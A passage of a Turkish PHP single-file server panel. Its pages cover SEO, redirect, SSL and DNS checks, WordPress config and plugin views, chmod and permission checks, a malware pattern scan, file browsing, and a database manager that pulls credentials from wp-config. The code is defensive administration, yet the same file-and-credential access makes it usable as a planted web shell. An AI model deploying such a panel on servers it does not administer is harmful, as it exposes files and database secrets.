        <div style="flex:1"><input type="url" name="url" value="<?= htmlspecialchars($url) ?>" placeholder="https://ornek.com" required></div>
        <button type="submit" class="btn btn-primary">Kontrol Et</button>
    </form>
    <?php if ($result): ?>
    <?php if ($result['error']): ?><div class="alert alert-error"><?= htmlspecialchars($result['error']) ?></div><?php return; endif; ?>
    <div class="info-grid">
        <div class="info-card"><h4>HTTP Status</h4><div class="value"><?= $result['status'] ?> <span class="badge <?= $result['status'] == 200 ? 'badge-success' : 'badge-warning' ?>"><?= $result['status'] == 200 ? 'OK' : 'Dikkat' ?></span></div></div>
        <div class="info-card"><h4>Title (<?= $result['title_len'] ?> kar)</h4><div style="font-size:14px"><?= htmlspecialchars($result['title']) ?></div>
            <div style="margin-top:4px"><?php if ($result['title_len'] >= 30 && $result['title_len'] <= 60): ?><span class="badge badge-success">Ideal</span><?php elseif ($result['title_len'] > 0): ?><span class="badge badge-warning"><?= $result['title_len'] < 30 ? 'Kisa' : 'Uzun' ?></span><?php else: ?><span class="badge badge-danger">Yok!</span><?php endif; ?></div>
        </div>
        <div class="info-card"><h4>Description (<?= $result['desc_len'] ?> kar)</h4><div style="font-size:13px"><?= htmlspecialchars($result['description']) ?: '<span style="color:var(--danger)">YOK</span>' ?></div>
            <div style="margin-top:4px"><?php if ($result['desc_len'] >= 120 && $result['desc_len'] <= 160): ?><span class="badge badge-success">Ideal</span><?php elseif ($result['desc_len'] > 0): ?><span class="badge badge-warning"><?= $result['desc_len'] < 120 ? 'Kisa' : 'Uzun' ?></span><?php else: ?><span class="badge badge-danger">Yok!</span><?php endif; ?></div>
        </div>
    </div>
    <table class="data-table"><tbody>
        <tr><td style="width:120px;font-weight:600">Canonical</td><td><?= htmlspecialchars($result['canonical']) ?: '<span style="color:var(--warning)">Tanimlanmamis</span>' ?></td></tr>
        <tr><td style="font-weight:600">Robots</td><td><?= htmlspecialchars($result['robots']) ?: 'Varsayilan (index, follow)' ?></td></tr>
        <tr><td style="font-weight:600">H1</td><td><?= $result['h1'] ? htmlspecialchars(implode(' | ', $result['h1'])) . ' <span class="badge ' . (count($result['h1']) == 1 ? 'badge-success' : 'badge-warning') . '">' . count($result['h1']) . ' adet</span>' : '<span style="color:var(--danger)">H1 YOK!</span>' ?></td></tr>
        <?php foreach ($result['og'] as $k => $v): ?>
        <tr><td style="font-weight:600">og:<?= $k ?></td><td><?= htmlspecialchars($v) ?></td></tr>
        <?php endforeach; ?>
    </tbody></table>
    <?php endif; ?>
    <?php
}

function sm_page_redirect_check() {
    $url = $_GET['url'] ?? '';
    $chain = $url ? sm_check_redirect_chain($url) : [];
    ?><h2 style="margin-bottom:16px">Redirect Zinciri Kontrol</h2>
    <form method="GET" style="display:flex;gap:8px;margin-bottom:16px">
        <input type="hidden" name="action" value="redirect_check">
        <div style="flex:1"><input type="url" name="url" value="<?= htmlspecialchars($url) ?>" placeholder="https://ornek.com" required></div>
        <button type="submit" class="btn btn-primary">Kontrol Et</button>
    </form>
    <?php if ($chain): ?>
    <table class="data-table"><thead><tr><th>#</th><th>URL</th><th>Status</th></tr></thead><tbody>
    <?php foreach ($chain as $i => $c): ?>
    <tr><td><?= $i + 1 ?></td><td style="word-break:break-all"><?= htmlspecialchars($c['url']) ?></td>
        <td><span class="badge <?php
            if ($c['status'] == 200) echo 'badge-success';
            elseif ($c['status'] >= 300 && $c['status'] < 400) echo 'badge-info';
            elseif ($c['status'] === 'ERROR') echo 'badge-danger';
            else echo 'badge-warning';
        ?>"><?= $c['status'] ?></span></td></tr>
    <?php endforeach; ?></tbody></table>
    <?php if (count($chain) > 2): ?><div class="alert alert-warning" style="margin-top:8px"><?= count($chain) - 1 ?> redirect var. Fazla redirect SEO'ya zarar verir!</div><?php endif; ?>
    <?php endif; ?>
    <?php
}

function sm_page_wp_manager($doc_root, $wp_sites) {
    ?><h2 style="margin-bottom:16px">WordPress Yonetici</h2>
    <?php if (!$wp_sites): ?><div class="alert alert-info">WordPress sitesi bulunamadi.</div><?php return; endif;
    foreach ($wp_sites as $site):
        $config = sm_parse_wp_config($site);
        $plugins = sm_wp_get_plugins($site);
        $themes = sm_wp_get_themes($site);
        $maintenance = file_exists($site . '/.maintenance');
        $uploads_size = sm_wp_uploads_size($site);
        $label = basename($site) === basename($doc_root) ? 'Ana Site' : basename($site);
    ?>
    <div class="site-card">
        <h4><?= $label ?> <?= $maintenance ? '<span class="badge badge-warning">Bakim Modu</span>' : '' ?></h4>
        <div class="site-path"><?= $site ?></div>
        <div class="info-grid" style="margin-top:10px">
            <div class="info-card"><h4>Veritabani</h4><div class="value" style="font-size:14px"><?= $config['db_name'] ?? '-' ?></div><div style="font-size:12px;color:var(--text2)"><?= ($config['db_user'] ?? '') . '@' . ($config['db_host'] ?? '') ?></div></div>
            <div class="info-card"><h4>Debug</h4><div class="value"><?= ($config['debug'] ?? false) ? '<span style="color:var(--warning)">ACIK</span>' : '<span style="color:var(--success)">Kapali</span>' ?></div></div>
            <div class="info-card"><h4>Uploads</h4><div class="value"><?= sm_format_size($uploads_size) ?></div></div>
            <div class="info-card"><h4>Tablo Oneki</h4><div class="value"><?= $config['table_prefix'] ?? 'wp_' ?></div></div>
        </div>
        <div style="display:flex;gap:6px;flex-wrap:wrap;margin:10px 0">
            <form method="POST" style="display:inline"><input type="hidden" name="_token" value="<?= sm_token() ?>"><input type="hidden" name="action" value="wp_toggle_debug"><input type="hidden" name="wp_path" value="<?= htmlspecialchars($site) ?>"><button type="submit" class="btn btn-sm"><?= ($config['debug'] ?? false) ? 'Debug Kapat' : 'Debug Ac' ?></button></form>
            <form method="POST" style="display:inline"><input type="hidden" name="_token" value="<?= sm_token() ?>"><input type="hidden" name="action" value="wp_toggle_maintenance"><input type="hidden" name="wp_path" value="<?= htmlspecialchars($site) ?>"><button type="submit" class="btn btn-sm <?= $maintenance ? 'btn-warning' : '' ?>"><?= $maintenance ? 'Bakim Modu Kapat' : 'Bakim Modu Ac' ?></button></form>
            <a href="?action=edit&path=<?= urlencode($site . '/wp-config.php') ?>" class="btn btn-sm">wp-config.php</a>
            <a href="?action=browse&path=<?= urlencode($site . '/wp-content/uploads') ?>" class="btn btn-sm">Uploads</a>
        </div>
        <?php if ($plugins): ?>
        <h4 style="margin:12px 0 6px">Eklentiler (<?= count($plugins) ?>)</h4>
        <table class="data-table"><thead><tr><th>Eklenti</th><th>Versiyon</th><th>Islem</th></tr></thead><tbody>
        <?php foreach ($plugins as $p): ?>
        <tr><td><?= htmlspecialchars($p['name']) ?></td><td><?= $p['version'] ?></td><td><a href="?action=browse&path=<?= urlencode($p['path']) ?>" class="btn btn-sm">Dosyalar</a></td></tr>
        <?php endforeach; ?></tbody></table>
        <?php endif; ?>
        <?php if ($themes): ?>
        <h4 style="margin:12px 0 6px">Temalar (<?= count($themes) ?>)</h4>
        <table class="data-table"><thead><tr><th>Tema</th><th>Versiyon</th><th>Islem</th></tr></thead><tbody>
        <?php foreach ($themes as $t): ?>
        <tr><td><?= htmlspecialchars($t['name']) ?></td><td><?= $t['version'] ?></td><td><a href="?action=browse&path=<?= urlencode($t['path']) ?>" class="btn btn-sm">Dosyalar</a></td></tr>
        <?php endforeach; ?></tbody></table>
        <?php endif; ?>
    </div>
    <?php endforeach; ?>
    <?php
}

function sm_page_permissions($doc_root, $wp_sites) {
    $check_path = $_GET['check_path'] ?? $doc_root;
    $checks = sm_check_permissions($check_path);
    ?>
    <div class="page-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg> Izin ve Yetki Kontrolu</div>

    <?php if (count($wp_sites) > 1 || $check_path !== $doc_root): ?>
    <div style="margin-bottom:16px;display:flex;gap:6px;flex-wrap:wrap">
        <a href="?action=permissions&check_path=<?= urlencode($doc_root) ?>" class="btn btn-sm <?= $check_path === $doc_root ? 'btn-primary' : '' ?>">Ana Dizin</a>
        <?php foreach ($wp_sites as $s): if ($s !== $doc_root): ?>
        <a href="?action=permissions&check_path=<?= urlencode($s) ?>" class="btn btn-sm <?= $check_path === $s ? 'btn-primary' : '' ?>"><?= basename($s) ?></a>
        <?php endif; endforeach; ?>
    </div>
    <?php endif; ?>

    <div style="font-size:12px;color:var(--text2);margin-bottom:16px;font-family:monospace"><?= htmlspecialchars($check_path) ?></div>

    <!-- .htaccess Durumu -->
    <h3 style="margin-bottom:12px">.htaccess Durumu</h3>
    <div class="info-grid">
        <div class="info-card">
            <h4>.htaccess Dosyasi</h4>
            <div class="value"><?= $checks['htaccess_exists'] ? '<span class="badge badge-success">Mevcut</span>' : '<span class="badge badge-warning">Yok</span>' ?></div>
        </div>
        <div class="info-card">
            <h4>Okunabilir</h4>
            <div class="value"><?= $checks['htaccess_readable'] ? '<span class="badge badge-success">Evet</span>' : '<span class="badge badge-danger">Hayir</span>' ?></div>
        </div>
        <div class="info-card">
            <h4>Yazilabilir</h4>
            <div class="value"><?= $checks['htaccess_writable'] ? '<span class="badge badge-success">Evet</span>' : '<span class="badge badge-danger">Hayir</span>' ?></div>
            <?php if (!$checks['htaccess_writable']): ?>
            <div style="font-size:11px;color:var(--danger);margin-top:4px">.htaccess duzenlenemez! chmod 644 gerekli.</div>
            <?php endif; ?>
        </div>
        <div class="info-card">
            <h4>Izin</h4>
            <div class="value" style="font-family:monospace"><?= $checks['htaccess_perms'] ?></div>
        </div>
        <div class="info-card">
            <h4>mod_rewrite</h4>
            <div class="value"><?php
                if ($checks['mod_rewrite'] === true) echo '<span class="badge badge-success">Aktif</span>';
                elseif ($checks['mod_rewrite'] === false) echo '<span class="badge badge-danger">Pasif</span>';
                else echo '<span class="badge badge-warning">Bilinmiyor</span>';
            ?></div>
        </div>
        <div class="info-card">
            <h4>Dizin Yazma</h4>
            <div class="value"><?= $checks['dir_writable'] ? '<span class="badge badge-success">Evet</span>' : '<span class="badge badge-danger">Hayir</span>' ?></div>
            <div style="font-size:11px;color:var(--text3);margin-top:2px"><?= $checks['dir_perms'] ?></div>
        </div>
    </div>

    <?php if (!$checks['htaccess_writable'] && $checks['htaccess_exists']): ?>
    <div class="site-card" style="border-left:3px solid var(--warning)">
        <h4 style="color:var(--warning)">.htaccess Yazma Izni Yok</h4>
        <p style="color:var(--text2);font-size:13px;margin:8px 0">Dosya mevcut ama PHP uzerinden duzenlenemiyor. Bu genelde sunucu guvenlik ayarindan kaynaklanir.</p>

        <div style="margin:12px 0">
            <strong style="font-size:13px">Cozum Yollari:</strong>
            <ol style="margin:8px 0 0 20px;color:var(--text2);font-size:13px;line-height:1.8">
                <li><strong>Otomatik duzelt</strong> - Asagidaki butona tiklayin (chmod 644 dener)
                    <form method="POST" style="display:inline;margin-left:8px"><input type="hidden" name="_token" value="<?= sm_token() ?>"><input type="hidden" name="action" value="chmod"><input type="hidden" name="chmod_path" value="<?= htmlspecialchars($check_path . '/.htaccess') ?>"><input type="hidden" name="chmod_val" value="0644"><button type="submit" class="btn btn-sm btn-warning">chmod 644 Uygula</button></form>
                </li>
                <li><strong>cPanel</strong> - File Manager > .htaccess > Permissions > 644 olarak degistirin</li>
                <li><strong>FTP</strong> - FileZilla ile .htaccess'e sag tik > File permissions > 644</li>
                <li><strong>Hosting</strong> - Destek'e "PHP'nin .htaccess'e yazma izni yok" deyin</li>
            </ol>
        </div>

        <div style="background:var(--bg);padding:10px 14px;border-radius:var(--radius);margin-top:8px">
            <table style="font-size:12px;color:var(--text2)">
                <tr><td style="padding:2px 12px 2px 0;font-weight:600">Dosya izni:</td><td><code><?= $checks['htaccess_perms'] ?></code></td></tr>
                <tr><td style="padding:2px 12px 2px 0;font-weight:600">Dosya sahibi:</td><td><?= $checks['htaccess_owner'] !== -1 ? $checks['htaccess_owner'] : 'Bilinmiyor' ?></td></tr>
                <tr><td style="padding:2px 12px 2px 0;font-weight:600">PHP kullanicisi:</td><td><?= $checks['php_user'] !== -1 ? $checks['php_user'] : 'Bilinmiyor' ?></td></tr>
                <tr><td style="padding:2px 12px 2px 0;font-weight:600">Sahiplik eslesmesi:</td><td><?php
                    if ($checks['htaccess_owner_match'] === true) echo '<span class="badge badge-success">Eslesir</span>';
                    elseif ($checks['htaccess_owner_match'] === false) echo '<span class="badge badge-danger">Eslesmez - Ana sebep bu!</span>';
                    else echo '<span class="badge badge-warning">Kontrol edilemiyor</span>';
                ?></td></tr>
            </table>
        </div>

        <?php if ($checks['htaccess_owner_match'] === false): ?>
        <div class="alert alert-info" style="margin-top:12px;margin-bottom:0">
            <strong>Sebep:</strong> .htaccess dosyasinin sahibi (<?= $checks['htaccess_owner'] ?>) ile PHP'nin calistigi kullanici (<?= $checks['php_user'] ?>) farkli. Bu yuzden PHP dosyaya yazamiyor. cPanel'den dosya sahibini degistirin veya 666 izni verin.
        </div>
        <?php endif; ?>
    </div>
    <?php endif; ?>

    <?php if ($checks['htaccess_writable'] && $checks['htaccess_exists']): ?>
    <div class="alert alert-success">.htaccess dosyasi duzenlemeye hazir. Tum islemlerinizi yapabilirsiniz.</div>
    <?php endif; ?>

    <?php if (!$checks['htaccess_exists']): ?>
    <div class="site-card" style="border-left:3px solid var(--info)">
        <h4>.htaccess Dosyasi Bulunamadi</h4>
        <p style="color:var(--text2);font-size:13px;margin:8px 0">Bu dizinde .htaccess dosyasi yok. <?= $checks['dir_writable'] ? 'Yeni bir tane olusturabilirsiniz:' : 'Dizin yazma izni olmadigi icin olusturulamiyor.' ?></p>
        <?php if ($checks['dir_writable']): ?>
        <form method="POST" style="margin-top:8px"><input type="hidden" name="_token" value="<?= sm_token() ?>"><input type="hidden" name="action" value="create_file"><input type="hidden" name="create_dir" value="<?= htmlspecialchars($check_path) ?>"><input type="hidden" name="new_name" value=".htaccess"><button type="submit" class="btn btn-sm btn-primary">.htaccess Olustur</button></form>
        <?php endif; ?>
    </div>
    <?php endif; ?>

    <!-- Dizin Izinleri -->
    <h3 style="margin:20px 0 12px">Dizin Izinleri</h3>
    <table class="data-table">
        <thead><tr><th>Dizin</th><th>Izin</th><th>Okunabilir</th><th>Yazilabilir</th><th>Durum</th></tr></thead>
        <tbody>
        <?php foreach ($checks['dir_permissions'] as $dp): ?>
        <tr>
            <td style="font-family:monospace;font-size:12px"><?= htmlspecialchars($dp['path']) ?></td>
            <td><code><?= $dp['perms'] ?></code></td>
            <td><?= $dp['readable'] ? '<span class="badge badge-success">Evet</span>' : '<span class="badge badge-danger">Hayir</span>' ?></td>
            <td><?= $dp['writable'] ? '<span class="badge badge-success">Evet</span>' : '<span class="badge badge-danger">Hayir</span>' ?></td>
            <td><?php
                if ($dp['readable'] && $dp['writable']) echo '<span class="badge badge-success">OK</span>';
                elseif ($dp['readable']) echo '<span class="badge badge-warning">Salt Okunur</span>';
                else echo '<span class="badge badge-danger">Erisim Yok</span>';
            ?></td>
        </tr>
        <?php endforeach; ?>
        </tbody>
    </table>

    <!-- PHP Ayarlari -->
    <h3 style="margin:20px 0 12px">PHP Ayarlari</h3>
    <div class="perm-grid">
        <div class="perm-item">
            <div><div class="perm-label">allow_url_fopen</div><div class="perm-detail">Uzak dosya okuma</div></div>
            <?= $checks['allow_url_fopen'] ? '<span class="badge badge-success">Acik</span>' : '<span class="badge badge-warning">Kapali</span>' ?>
        </div>
        <div class="perm-item">
            <div><div class="perm-label">file_uploads</div><div class="perm-detail">Dosya yukleme</div></div>
            <?= $checks['file_uploads'] ? '<span class="badge badge-success">Acik</span>' : '<span class="badge badge-danger">Kapali</span>' ?>
        </div>
        <div class="perm-item">
            <div><div class="perm-label">Max Upload</div><div class="perm-detail">Maks. dosya boyutu</div></div>
            <span class="badge badge-info"><?= $checks['max_upload'] ?></span>
        </div>
        <div class="perm-item">
            <div><div class="perm-label">Max POST</div><div class="perm-detail">Maks. POST boyutu</div></div>
            <span class="badge badge-info"><?= $checks['max_post'] ?></span>
        </div>
        <div class="perm-item">
            <div><div class="perm-label">Memory Limit</div><div class="perm-detail">PHP bellek limiti</div></div>
            <span class="badge badge-info"><?= $checks['memory_limit'] ?></span>
        </div>
        <div class="perm-item">
            <div><div class="perm-label">Max Execution</div><div class="perm-detail">Maks. calisma suresi</div></div>
            <span class="badge badge-info"><?= $checks['max_execution'] ?>s</span>
        </div>
    </div>

    <!-- PHP Uzantilari -->
    <h3 style="margin:20px 0 12px">PHP Uzantilari</h3>
    <div class="perm-grid">
        <?php foreach ($checks['extensions'] as $ext => $loaded): ?>
        <div class="perm-item">
            <div class="perm-label"><?= $ext ?></div>
            <?= $loaded ? '<span class="badge badge-success">Yuklu</span>' : '<span class="badge badge-danger">Eksik</span>' ?>
        </div>
        <?php endforeach; ?>
    </div>

    <?php if (!empty($checks['disabled_functions'])): ?>
    <h3 style="margin:20px 0 12px">Devre Disi Fonksiyonlar</h3>
    <div style="display:flex;flex-wrap:wrap;gap:4px">
        <?php foreach ($checks['disabled_functions'] as $fn): if ($fn): ?>
        <span class="badge badge-warning"><?= htmlspecialchars($fn) ?></span>
        <?php endif; endforeach; ?>
    </div>
    <?php endif; ?>

    <!-- Ozet -->
    <h3 style="margin:20px 0 12px">Genel Degerlendirme</h3>
    <?php
    $score = 0; $total = 0;
    $total++; if ($checks['htaccess_writable']) $score++;
    $total++; if ($checks['mod_rewrite']) $score++;
    $total++; if ($checks['dir_writable']) $score++;
    $total++; if ($checks['file_uploads']) $score++;
    $total++; if ($checks['allow_url_fopen']) $score++;
    foreach ($checks['extensions'] as $l) { $total++; if ($l) $score++; }
    $pct = round(($score / $total) * 100);
    ?>
    <div class="info-card" style="max-width:400px">
        <h4>Uyumluluk Skoru</h4>
        <div class="value" style="color:<?= $pct > 80 ? 'var(--success)' : ($pct > 50 ? 'var(--warning)' : 'var(--danger)') ?>">%<?= $pct ?></div>
        <div style="margin-top:8px;height:6px;background:var(--bg);border-radius:3px;overflow:hidden">
            <div style="width:<?= $pct ?>%;height:100%;background:<?= $pct > 80 ? 'var(--success)' : ($pct > 50 ? 'var(--warning)' : 'var(--danger)') ?>;border-radius:3px;transition:width 0.3s"></div>
        </div>
        <div style="font-size:12px;color:var(--text2);margin-top:6px"><?= $score ?>/<?= $total ?> kontrol basarili</div>
    </div>
    <?php
}

function sm_page_malware_scan($doc_root) {
    $scan_dir = $_GET['scan_dir'] ?? $doc_root;
    $do_scan = isset($_GET['scan']);
    $results = null;
    if ($do_scan) $results = sm_scan_malware($scan_dir);
    ?><h2 style="margin-bottom:16px">Malware Tarama</h2>
    <form method="GET" style="display:flex;gap:8px;margin-bottom:16px">
        <input type="hidden" name="action" value="malware_scan"><input type="hidden" name="scan" value="1">
        <div style="flex:1"><input type="text" name="scan_dir" value="<?= htmlspecialchars($scan_dir) ?>" placeholder="Dizin"></div>
        <button type="submit" class="btn btn-danger">Taramayi Baslat</button>
    </form>
    <div class="alert alert-info">PHP dosyalari bilinen zararli patternler icin taranir. exec/system/eval kullanilmaz.</div>
    <?php if ($results !== null): ?>
    <div style="margin-bottom:8px"><strong><?= $results['scanned'] ?></strong> dosya tarandi, <strong style="color:<?= count($results['found']) ? 'var(--danger)' : 'var(--success)' ?>"><?= count($results['found']) ?></strong> supheli bulundu</div>
    <?php if ($results['found']): ?>
    <table class="data-table"><thead><tr><th>Dosya</th><th>Sebep</th><th>Boyut</th><th>Tarih</th><th>Islem</th></tr></thead><tbody>
    <?php foreach ($results['found'] as $f): ?>
    <tr><td><a href="?action=edit&path=<?= urlencode($f['file']) ?>"><?= htmlspecialchars(basename($f['file'])) ?></a><br><span style="font-size:11px;color:var(--text2)"><?= htmlspecialchars(dirname($f['file'])) ?></span></td>
        <td><span class="badge badge-danger"><?= $f['pattern'] ?></span></td><td><?= sm_format_size($f['size']) ?></td><td><?= $f['modified'] ?></td>
        <td><a href="?action=edit&path=<?= urlencode($f['file']) ?>" class="btn btn-sm">Incele</a></td></tr>
    <?php endforeach; ?></tbody></table>
    <?php else: ?><div class="alert alert-success">Supheli dosya bulunamadi.</div><?php endif; ?>
    <?php endif; ?>
    <?php
}

function sm_page_wp_integrity($wp_sites) {
    ?><h2 style="margin-bottom:16px">WordPress Butunluk Kontrolu</h2>
    <?php if (!$wp_sites): ?><div class="alert alert-info">WordPress sitesi bulunamadi.</div><?php return; endif;
    $site = $_GET['wp_path'] ?? $wp_sites[0];
    if (!empty($wp_sites) && count($wp_sites) > 1): ?>
    <div style="margin-bottom:12px;display:flex;gap:6px">
    <?php foreach ($wp_sites as $s): ?>
        <a href="?action=wp_integrity&wp_path=<?= urlencode($s) ?>" class="btn btn-sm <?= $s === $site ? 'btn-primary' : '' ?>"><?= basename($s) ?></a>
    <?php endforeach; ?></div>
    <?php endif;
    $results = sm_check_wp_core_files($site);
    ?><table class="data-table"><thead><tr><th>Dosya</th><th>Durum</th><th>Boyut</th><th>Son Degisiklik</th></tr></thead><tbody>
    <?php foreach ($results as $r): ?>
    <tr><td><?= $r['file'] ?></td>
        <td><?php if (!$r['exists']): ?><span class="badge badge-warning">Eksik</span>
            <?php elseif ($r['suspicious']): ?><span class="badge badge-danger"><?= $r['reason'] ?></span>
            <?php else: ?><span class="badge badge-success">OK</span><?php endif; ?></td>
        <td><?= $r['exists'] ? sm_format_size($r['size']) : '-' ?></td>
        <td><?= $r['exists'] ? $r['modified'] : '-' ?></td></tr>
    <?php endforeach; ?></tbody></table>
    <?php
}

function sm_page_activity_log() {
    $logs = sm_get_logs(200);
    ?><h2 style="margin-bottom:16px">Islem Kaydi</h2>
    <p style="color:var(--text2);font-size:12px;margin-bottom:12px"><?= count($logs) ?> kayit (en yeni ustte)</p>
    <table class="data-table"><thead><tr><th>Tarih</th><th>IP</th><th>Islem</th><th>Detay</th></tr></thead><tbody>
    <?php foreach ($logs as $line):
        $parts = explode(' | ', $line, 4);
        if (count($parts) < 3) continue;
    ?>
    <tr><td style="white-space:nowrap"><?= htmlspecialchars($parts[0]) ?></td><td><?= htmlspecialchars($parts[1]) ?></td>
        <td><span class="badge badge-info"><?= htmlspecialchars($parts[2]) ?></span></td>
        <td style="font-size:12px;max-width:400px;overflow:hidden;text-overflow:ellipsis"><?= htmlspecialchars($parts[3] ?? '') ?></td></tr>
    <?php endforeach; ?></tbody></table>
    <?php if (empty($logs)): ?><div class="alert alert-info">Henuz kayit yok.</div><?php endif; ?>
    <?php
}

function sm_page_recent_files($doc_root) {
    $hours = (int)($_GET['hours'] ?? 48);
    $dir = $_GET['scan_dir'] ?? $doc_root;
    $files = sm_recently_changed($dir, $hours);
    ?><h2 style="margin-bottom:16px">Son Degisen Dosyalar</h2>
    <form method="GET" style="display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap">
        <input type="hidden" name="action" value="recent_files">
        <div style="flex:1;min-width:200px"><label style="font-size:12px">Dizin</label><input type="text" name="scan_dir" value="<?= htmlspecialchars($dir) ?>"></div>
        <div style="width:100px"><label style="font-size:12px">Son (saat)</label><input type="number" name="hours" value="<?= $hours ?>" min="1" max="720"></div>
        <button type="submit" class="btn btn-primary" style="align-self:end">Tara</button>
    </form>
    <p style="color:var(--text2);font-size:12px;margin-bottom:8px"><?= count($files) ?> dosya (son <?= $hours ?> saat)</p>
    <table class="data-table"><thead><tr><th>Dosya</th><th>Yol</th><th>Boyut</th><th>Degistirilme</th></tr></thead><tbody>
    <?php foreach ($files as $f): ?>
    <tr><td><a href="?action=edit&path=<?= urlencode($f['path']) ?>"><?= htmlspecialchars($f['name']) ?></a></td>
        <td style="color:var(--text2);font-size:12px;max-width:300px;overflow:hidden;text-overflow:ellipsis"><?= htmlspecialchars(dirname($f['path'])) ?></td>
        <td><?= $f['size'] ?></td><td><?= $f['modified'] ?></td></tr>
    <?php endforeach; ?></tbody></table>
    <?php
}

function sm_page_dual_panel($current_dir) {
    $left_path = $_GET['left'] ?? $current_dir;
    $right_path = $_GET['right'] ?? dirname($current_dir);
    $left_items = sm_scan_dir($left_path);
    $right_items = sm_scan_dir($right_path);
    ?><h2 style="margin-bottom:16px">Cift Panel</h2>
    <div style="display:flex;gap:8px;margin-bottom:12px">
        <form method="GET" style="display:flex;gap:8px;flex:1"><input type="hidden" name="action" value="dual_panel">
            <input type="text" name="left" value="<?= htmlspecialchars($left_path) ?>" placeholder="Sol panel">
            <input type="text" name="right" value="<?= htmlspecialchars($right_path) ?>" placeholder="Sag panel">
            <button type="submit" class="btn btn-primary">Git</button>
        </form>
    </div>
    <div class="dual-panel">
        <div class="panel"><div class="panel-header"><?= htmlspecialchars($left_path) ?></div><div class="panel-body">
            <table><?php if ($left_path !== sm_root_dir()): ?><tr><td><a href="?action=dual_panel&left=<?= urlencode(dirname($left_path)) ?>&right=<?= urlencode($right_path) ?>">&#128194; ..</a></td></tr><?php endif; ?>
            <?php foreach ($left_items as $item): ?>
            <tr><td><?php if ($item['is_dir']): ?><a href="?action=dual_panel&left=<?= urlencode($item['path']) ?>&right=<?= urlencode($right_path) ?>">&#128193; <?= htmlspecialchars($item['name']) ?></a>
                <?php else: ?><a href="?action=edit&path=<?= urlencode($item['path']) ?>">&#128196; <?= htmlspecialchars($item['name']) ?></a> <span style="color:var(--text2);font-size:11px"><?= $item['size'] ?></span><?php endif; ?></td></tr>
            <?php endforeach; ?></table>
        </div></div>
        <div class="panel"><div class="panel-header"><?= htmlspecialchars($right_path) ?></div><div class="panel-body">
            <table><?php if ($right_path !== sm_root_dir()): ?><tr><td><a href="?action=dual_panel&left=<?= urlencode($left_path) ?>&right=<?= urlencode(dirname($right_path)) ?>">&#128194; ..</a></td></tr><?php endif; ?>
            <?php foreach ($right_items as $item): ?>
            <tr><td><?php if ($item['is_dir']): ?><a href="?action=dual_panel&left=<?= urlencode($left_path) ?>&right=<?= urlencode($item['path']) ?>">&#128193; <?= htmlspecialchars($item['name']) ?></a>
                <?php else: ?><a href="?action=edit&path=<?= urlencode($item['path']) ?>">&#128196; <?= htmlspecialchars($item['name']) ?></a> <span style="color:var(--text2);font-size:11px"><?= $item['size'] ?></span><?php endif; ?></td></tr>
            <?php endforeach; ?></table>
        </div></div>
    </div>
    <?php
}

function sm_page_ssl_check() {
    $domain = $_GET['domain'] ?? '';
    $result = null;
    if ($domain) $result = sm_check_ssl(preg_replace('/^https?:\/\//', '', $domain));
    ?><h2 style="margin-bottom:16px">SSL Sertifika Kontrol</h2>
    <form method="GET" style="display:flex;gap:8px;margin-bottom:16px">
        <input type="hidden" name="action" value="ssl_check">
        <div style="flex:1"><input type="text" name="domain" value="<?= htmlspecialchars($domain) ?>" placeholder="ornek.com" required></div>
        <button type="submit" class="btn btn-primary">Kontrol Et</button>
    </form>
    <?php if ($result): ?>
    <?php if ($result['error']): ?><div class="alert alert-error"><?= htmlspecialchars($result['error']) ?></div><?php return; endif; ?>
    <div class="info-grid">
        <div class="info-card"><h4>Durum</h4><div class="value"><span class="badge <?= $result['days_left'] > 30 ? 'badge-success' : ($result['days_left'] > 7 ? 'badge-warning' : 'badge-danger') ?>"><?= $result['days_left'] > 0 ? 'Gecerli' : 'Suresi Dolmus' ?></span></div></div>
        <div class="info-card"><h4>Kalan Gun</h4><div class="value"><?= $result['days_left'] ?></div></div>
        <div class="info-card"><h4>Saglayici</h4><div class="value" style="font-size:14px"><?= htmlspecialchars($result['issuer']) ?></div></div>
        <div class="info-card"><h4>CN</h4><div class="value" style="font-size:14px"><?= htmlspecialchars($result['cn']) ?></div></div>
    </div>
    <table class="data-table"><tbody>
        <tr><td style="width:150px;font-weight:600">Gecerlilik Baslangici</td><td><?= $result['valid_from'] ?></td></tr>
        <tr><td style="font-weight:600">Bitis Tarihi</td><td><?= $result['expires'] ?></td></tr>
        <?php if (!empty($result['san'])): ?><tr><td style="font-weight:600">SAN (Alt Domainler)</td><td><?= htmlspecialchars(implode(', ', $result['san'])) ?></td></tr><?php endif; ?>
    </tbody></table>
    <?php endif; ?>
    <?php
}

function sm_page_dns_lookup() {
    $domain = $_GET['domain'] ?? '';
    $results = $domain ? sm_dns_lookup(preg_replace('/^https?:\/\//', '', $domain)) : [];
    ?><h2 style="margin-bottom:16px">DNS Sorgulama</h2>
    <form method="GET" style="display:flex;gap:8px;margin-bottom:16px">
        <input type="hidden" name="action" value="dns_lookup">
        <div style="flex:1"><input type="text" name="domain" value="<?= htmlspecialchars($domain) ?>" placeholder="ornek.com" required></div>
        <button type="submit" class="btn btn-primary">Sorgula</button>
    </form>
    <?php if ($results): ?>
    <table class="data-table"><thead><tr><th>Tip</th><th>Deger</th><th>TTL</th></tr></thead><tbody>
    <?php foreach ($results as $r): ?>
    <tr><td><span class="badge badge-info"><?= $r['type'] ?></span></td><td style="word-break:break-all"><?= htmlspecialchars($r['value']) ?></td><td><?= $r['ttl'] ?></td></tr>
    <?php endforeach; ?></tbody></table>
    <?php elseif ($domain): ?><div class="alert alert-info">DNS kaydi bulunamadi.</div><?php endif; ?>
    <?php
}

function sm_page_db_manager($wp_sites) {
    $host = $_GET['db_host'] ?? '';
    $user = $_GET['db_user'] ?? '';
    $db = $_GET['db_name'] ?? '';
    $pass = $_POST['db_pass'] ?? ($_SESSION['sm_db_pass'] ?? '');
    $sql = $_GET['sql'] ?? '';
    $wp_path = $_GET['wp_path'] ?? '';

    // Auto-fill from WP config
    if ($wp_path && !$host) {
        $config = sm_parse_wp_config($wp_path);
        $host = $config['db_host'] ?? 'localhost';
        $user = $config['db_user'] ?? '';
        $db = $config['db_name'] ?? '';
        $pass = $config['db_pass'] ?? '';
        if ($pass) $_SESSION['sm_db_pass'] = $pass;
    }

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['db_pass'])) {
        $_SESSION['sm_db_pass'] = $_POST['db_pass'];
        $pass = $_POST['db_pass'];
    }

    ?><h2 style="margin-bottom:16px">Veritabani Yonetici</h2>
